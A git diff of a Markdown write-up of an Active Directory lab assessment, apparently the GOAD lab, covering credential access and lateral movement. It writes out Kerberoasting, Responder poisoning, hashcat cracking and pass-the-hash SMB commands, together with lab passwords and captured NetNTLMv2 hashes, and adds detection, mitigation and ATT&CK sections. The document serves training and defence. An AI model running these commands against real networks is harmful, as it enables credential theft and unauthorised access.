@@ -1,120 +1,109 @@
-# 3. Credential Access
+# Credential Access and Lateral Movement
 
-## 3.1 Kerberoasting
+## Objective
 
-Is an attack technique which tries to identify service accounts with SPNs (Service Principal Names). 
-After identifying service accounts, it uses a valid domain user account to request tickets for the SPNs. These tickets are encrypted using the NTLM hash of the service account's password. These tickets are extracted and then if these hashes are cracked, the plaintext password of the service account is exposed.
+This phase tested whether the authenticated access obtained earlier could expose service-accoutn credentials, captured NTLM authentication, and accessible network shares.
 
-To launch this attack, I will use again an impacket tool: GetUserSPN.
+## Starting position
 
-```shell
-GetUserSPNs.py -request -dc-ip 10.4.10.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting
-```
+- Several valid accounts in `north.sevenkingdoms.local`
+- No Domain Admin credential
+- A confirmed user and group inventory
+- Network access to the GOAD systems
 
-The result I got is:
+## Kerberoasting
 
-<img width="1438" alt="Pasted_image_20241223113738" src="https://github.com/user-attachments/assets/32421729-574c-49c3-bd75-e50effbb1153" />
-
-So, I didn't get any tickets, and the reason is the error in the end of the response:
-`Kerberos Sessionrror: KRB_AP_ERR_SKEW(Clock skew too great)`, which means that there is a discrepancy in time from the our machine and the server that I'm trying to access.
-
-In this case I have to adjust the time on my machine (Kali) so they match.
-
-First disable the Network Time Protocol from auto-updating by running `sudo timedatectl set-ntp off`.
-
-Then match the date and time of Kali with the date and time of the target machine by running `sudo rdate -n 10.4.10.11`
-
-Now I'm going to try again the kerberoasting attack, and we got the hashes:
-<img width="1601" alt="Pasted_image_20241223124857" src="https://github.com/user-attachments/assets/93451ed6-9ddc-4b51-9a01-d581ca4dd20b" />
-
-So we got another password, and now in total we have pwned 4 accounts:
-
-```shell
-samwell.tarly:Heartsbane
-hodor:hodor
-brandon.stark:iseedeadpeople
-jon.snow:iknownothing
-```
-
-## 3.2 Responder 
-
-When you don't have any credentials, `responder` is a tool that may give you usernames, netntlmv1 (if the server is old), netntlmv2 hashes, the ability to redirect the authentication (NTLM relay), etc.
-
-- NetNLMv1 and NetNLMv2 - are password hashes used by NTLM (NT LAN Manager) authentication protocol, which is a legacy Microsoft authentication mechanism, and are primarily used in challenge-response authentication processes, such as authenticating users against servers or services.
-- NetNTLMv1 - is less secure and more vulnerable to attacks:
-	- A client sends its username and a challenge (random number)
-	- Server responds with a challenge
-	- The client uses the password to compute a hash to the challenge and sends it back.
-		- It's vulnerable against brute-force and cryptographic attacks because the challenge-response mechanism is not well-protected.
-
-- NetNLMv2 - is a more secure version of NTLM and includes stronger cryptographic measures.
-	- Similar to v1 but the challenge-response mechanism uses a hash timestamp, client nonce, and additional data to protect against replay attacks.
-		-  Still susceptible to certain relay attacks but much more resistant to brute-force than NetNTLMv1.
-
-- NTLM Relay - is a type of attack which exploits the way how NTLM authentication works, by relaying authentication attempts to another system or service.
-	- The attacker captures a challenge-response from a victim.
-	- Instead of cracking the hash, the attacker relays it to a different service or system that accepts NTLM authentication (SMB, LDAP, HTTP).
-	- If the relayed creds are valid, the attacker can gain unauthorized access to the target system.
-
-Now I will start `responder` to see if I can get some useful information, and to run the tool I need to know the network interface which I will target, to capture and analyze authentication attempts.
-
-Responder acts as a rogue server, and tricks devices on a network to send authentication data, which then the attacker can use for a number of attacks, such as cracking password hashes, and NTLM relay.
-
-By running `ip a` I see the network interfaces, and the name of the target is `eth0`.
-
-Then I run `responder -I eth0` and the following things happen:
-
-- Responder listens for specific protocols like: LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) on eth0.
-- When devices on network broadcast queries for names they can't resolve, Responder sends a fake reply pretending to be that service or host.
-- When the victim system attempts to authenticate to the fake service, Responder captures the credential hashes.
-
-By this method, I could get hashes of two accounts: **eddard.stark & robb.stark**:
+Kerberoasting was used to identify accounts with Service Principal Names (SPNs) and request service tickets that could be tested offline.
 
 ```bash
+GetUserSPNs.py -request -dc-ip 10.4.10.11 'north.sevenkingdoms.local/brandon.stark:iseedeadpeople' -outputfile kerberoast-hashes.txt
+```
+
+## Troubleshooting Kerberos clock skew
+
+The first request failed with:
+
+```text
+KRB_AP_ERR_SKEQ: Clock skew too great
+```
+
+Kerberos depends on time synchronisation. The Kali system was therefore aligned with the lab domain controller before the request was repeated:
+
+```bash
+sudo timedatectl set-ntp off
+sudo rdate -n 10.4.10.11
+```
+
+After syncrhonization, the service ticket request succeeded. One ticket was recovered offline with Hashcat, exposing the password for `jon.snow`:
+
+```text
+jon.snow:iknownothing
+```
+![alt text](../assets/evidence/03-credential-access/Kerberoasting.png)
+
+## LLMNR and NBT-NS poisoning
+
+Reponder was run to test whether systems would fall back to multicast or broadcast name resolution and send NTLM authentication to a rogue responder:
+
+```bash
+sudo responder -I eth0
+```
+
+Authentication attempts from two domain users were captured. The captured values were **NetNTLMv2 challenge-response data**, not reusable NT password hashes.
+
+```sh
 [SMB] NTLMv2-SSP Client   : 10.4.10.11
 [SMB] NTLMv2-SSP Username : NORTH\eddard.stark
 [SMB] NTLMv2-SSP Hash     : eddard.stark::NORTH:98db915729cbf673:CAA545B4D425834F5887741416A33EA4:0101000000000000806D80798655DB01D9983AFE29AEA80B0000000002000800540033003400380001001E00570049004E002D0034004200410059005A0059005600300047003300500004003400570049004E002D0034004200410059005A005900560030004700330050002E0054003300340038002E004C004F00430041004C000300140054003300340038002E004C004F00430041004C000500140054003300340038002E004C004F00430041004C0007000800806D80798655DB01060004000200000008003000300000000000000000000000003000005DE594947D1925B89E880EBD1422F0706D876ECC261071DC3B4B573725EFACA20A001000000000000000000000000000000000000900140063006900660073002F004D006500720065006E000000000000000000
 ```
 
-```bash
+```sh
 [SMB] NTLMv2-SSP Client   : 10.4.10.11
 [SMB] NTLMv2-SSP Username : NORTH\robb.stark
 [SMB] NTLMv2-SSP Hash     : robb.stark::NORTH:7f945256f0b1ca59:CA2F97E8985703DB0ABE10C43612E499:0101000000000000806D80798655DB0150433DACC59B7BB40000000002000800540033003400380001001E00570049004E002D0034004200410059005A0059005600300047003300500004003400570049004E002D0034004200410059005A005900560030004700330050002E0054003300340038002E004C004F00430041004C000300140054003300340038002E004C004F00430041004C000500140054003300340038002E004C004F00430041004C0007000800806D80798655DB01060004000200000008003000300000000000000000000000003000005DE594947D1925B89E880EBD1422F0706D876ECC261071DC3B4B573725EFACA20A001000000000000000000000000000000000000900160063006900660073002F0042007200610076006F0073000000000000000000
 ```
 
-Now export both hashes (only the hash starting with for example robb.stark...) to a file to try and crack them with hashcat.
+## Offline recovery
+
+The captured NetNTLMv2 responses were tested offline:
 
 ```bash
-hashcat -m 5600 --force -a 0 two_hashes /usr/share/wordlists/rockyou.txt
+hashcat -m 5600 captured-netntlmv2.txt /usr/share/wordlists/rockyou.txt
 ```
 
-I only got success with one account, one of robb.stark:
+One password was recovered successfully:
 
-```bash
+```sh
 ROBB.STARK::NORTH:7f945256f0b1ca59:ca2f97e8985703db0abe10c43612e499:0101000000000000806d80798655db0150433dacc59b7bb40000000002000800540033003400380001001e00570049004e002d0034004200410059005a0059005600300047003300500004003400570049004e002d0034004200410059005a005900560030004700330050002e0054003300340038002e004c004f00430041004c000300140054003300340038002e004c004f00430041004c000500140054003300340038002e004c004f00430041004c0007000800806d80798655db01060004000200000008003000300000000000000000000000003000005de594947d1925b89e880ebd1422f0706d876ecc261071dc3b4b573725efaca20a001000000000000000000000000000000000000900160063006900660073002f0042007200610076006f0073000000000000000000:sexywolfy
 ```
 
-Now let's see what kind of privileges does this account have:
+The other captured repsonse was not receovered with the tested wordlist.
+
+## Access validation
+
+The recovered `robb.stark` credential was validated against `WINTERFELL` and showed administrative access:
 
 ```bash
-crackmapexec smb 10.4.10.11 -u robb.stark -p sexywolfy --shares
+# Original syntax
+crackmapexec smb 10.4.10.11 -u robb.stark -p 'sexywolfy' --shares
+
+# Current equivalent
+nxc smb 10.4.10.11 -u robb.stark -p 'sexywolfy' --shares
 ```
 
-And this account has ADMIN privileges:
+![alt text](../assets/evidence/03-credential-access/robb_stark.png)
 
-<img width="1277" alt="Pasted_image_20241229172248" src="https://github.com/user-attachments/assets/a1c75f2b-8bbf-4033-a0e5-65e6a0dc6aa5" />
+## SMB share discovery and lateral movement
 
-I logged in with smbclient by passing the hash:
-
-`smbclient.py -hashes :831486ac7f26860c9e2f51ac91e1a07a NORTH/robb.stark@10.4.10.22`
-
-used all share:
-
-`use all`
-
-there i found an arya.txt file and inside it was a CTF with the password "Needle".
+The same account was used to access `CASTELBLACK` with Impacket's SMB client:
 
 ```bash
+smbclient.py -hashes :831486ac7f26860c9e2f51ac91e1a07a NORTH/robb.stark@10.4.10.22
+```
+
+An accessible share contained a message referring to Arya's sword, `Needle`. This clue corresponded to another predictable account password.
+
+```text
 Subject: Quick Departure
 
 Hey Arya,
@@ -126,14 +115,59 @@ I left a little surprise for you in your room – the sword You've named "Needle
 I'll explain everything when I return. Until then, stay sharp, sis.
 ```
 
-**Full Credential Set So Far**
+```text
+arya.stark:needle
+```
 
-```
-samwell.tarly : Heartsbane
-hodor         : hodor
-brandon.stark : iseedeadpeople
-jon.snow      : iknownothing
-robb.stark    : sexywolfy
-arya.stark    : needle
-```
+This was not a technical vulnerability in the file format or SMB protoocl. It was sensitive information stored in a location accessible to an already compromised user.
+
+## Result
+
+This phase expanded access through three distinct paths:
+
+- A service ticket was recovered and cracked offline
+- NetNTLMv2 authentication was captured through unsafe name-resolution behavior and one response was cracked
+- Administrative SMB access exposed additional sensitive information in a network share
+
+The recovered `robb.stark` credential became the key transition to hte next stage because it had sufficient privileges to extract domain credential material.
+
+## Security impact
+
+Service accounts and captured authentication can provide durable access even when no software exploit is available. Once a privileged credential is recovered, the attack can progress rapidly from user-level access to credential dumping and domain compromise.
+
+## Detection opportunities
+
+- Unusual volumes of serice-ticket requests, especitally RC4-encrypted tickets for service accounts
+- LLMNR, NBT-NS, or mDNS responses from systems that are not legitimate name-resolution servers
+- Outbound SMB authentication to unexpected hosts
+- Use of Responder-like protocol fingerprints
+- Access to administrative shares from unusual workstations or users
+- Reading sensitive files shortly after first authentication
+
+## Mitigation
+
+- Use group managed service accoutns or long, random serivce-account passwords
+- Prefer AES-capable Kerberos configuration and rec=duce unnecessary RC4 use
+- Disable LLMNR and NBT-NS where they are not required
+- Require SB signing and reduce NTLM use
+- Apply least privilege to network shares and remove password clues or operational secrets from shared files
+Monitor privileged share access and service-ticket behavior
+
+## MITRE ATT&CK mapping
+
+- `T1558.003` - Kerberoasting
+- `T1557.001` - LLMNR/NBT-NS Poisoning and SMB Relay
+- `T1110.002` - Password Cracking
+- `T1135` - Network Share Discovery
+- `T1021.002` - SMB/Windows Admin Shares
+
+## Key takeaway
+
+The strongest part of this phase was the chain: authenticated Kerberos access exposed a service account, unsafe name resolution exposed NTLM authentication, and weak share hygiene exposed another password. Each individual weakness was limited, but together they produced administrative access.
+
+## Navigation
+
+[Previous: Initial credential access](02-initial-credential-access.md) | [Assessment index](../README.md) | [Next: Privilege escalation and domain compromise](04-privilege-escalation-and-domain-compromise.md)
+
+
 
